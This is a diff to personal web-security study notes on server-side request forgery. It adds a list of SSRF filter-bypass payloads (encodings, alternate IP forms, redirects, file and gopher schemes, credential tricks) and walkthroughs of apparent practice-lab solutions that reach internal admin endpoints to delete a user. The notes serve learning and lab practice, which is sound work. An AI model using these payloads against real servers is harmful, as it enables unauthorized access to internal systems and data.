@@ -1124,6 +1124,39 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 - SSRF to Exploit Third-Party APIs
   `GET /fetch?url=http://api.thirdparty.com/userinfo?user_id=admin`
 
+**SSRF blacklisting bypass**
+- **URL encoding**   
+  `GET /fetch?url=http%3A%2F%2Flocalhost%2Fadmin`
+- **double URL encoding**   
+  `GET /fetch?url=http%253A%252F%252Flocalhost%252Fadmin`
+- **Case variation**   
+  `GET /fetch?url=HTTP://localhost/admin`   
+- **Using Different IP Representations**   
+  Decimal: http://2130706433/ (localhost)   
+  Octal: http://0177.0.0.01/ (localhost)   
+- **DNS Redirection**   
+  `GET /fetch?url=http://attacker-controlled-domain.com/`   
+- Redirects   
+  `GET /fetch?url=http://trusted-domain.com/redirect?url=http://localhost/admin`   
+- **Subdomains**   
+  `GET /fetch?url=http://sub.localhost/admin`   
+- Path-Based Attacks   
+  `GET /fetch?url=http://localhost%2F%2E%2E%2Fadmin`   
+- Bypassing Port Restrictions   
+  `GET /fetch?url=http://localhost:80/admin`   
+- Null Byte Injection   
+  `GET /fetch?url=http://localhost%00.evil.com/admin`   
+- Using Alternative Schemes   
+  `GET /fetch?url=file://localhost/admin`   
+- **Embed credentials in a URL before the hostname**   
+  `GET /fetch?url=http://user@localhost/admin`   
+- Using Malformed URLs   
+  `GET /fetch?url=http://localhost:/admin`   
+- **Exploiting Protocols**   
+  `GET /fetch?url=gopher://localhost/admin`   
+- **URL Fragments**   
+  `GET /fetch?url=http://localhost/#/admin`   
+
 **Mitigation**
 - Input Validation
 - allowlist to restrict which URLs the server can request
@@ -1133,10 +1166,30 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 - Logging and Monitoring: Implement logging and monitoring to detect suspicious activity.   
 
 ### SSRF Lab
-- Basic SSRF against the local server
-- ddd
-- ddd
-- ddd
+- Basic SSRF against the **local server**
+  - check stock
+    POST /product/stock   
+    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+  - change the stockApi url
+    stockApi=`http://localhost/admin/delete?username=carlos`
+- Basic SSRF against **another back-end system**
+  - check stock
+    POST /product/stock   
+    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+  - send to intruder > payloads number 1 to 255
+    stockApi=http://192.168.0.**§1§**:8080/admin   
+  - Found 200 response for port 47 > delete user
+    stockApi=http://192.168.0.**47**:8080/admin/delete?username=carlos  
+- SSRF with **blacklist-based** input filter
+  - Bypass blocking of http://127.0.0.1/, 'admin'
+  - `http://127.1/` OK
+  - double url encoding of 'admin' `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
+- SSRF with whitelist-based input filter
+  - http://127.0.0.1/ >  "External stock check host must be stock.weliketoshop.net"
+  - http://**user**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > embed credential accepted
+  - http://**user#**@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1 > # accepted
+  - http://localhost%2523@stock.weliketoshop.net > double encode '#' accepted
+  - http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos > delete user   
 - ddd
 - ddd
 - ddd
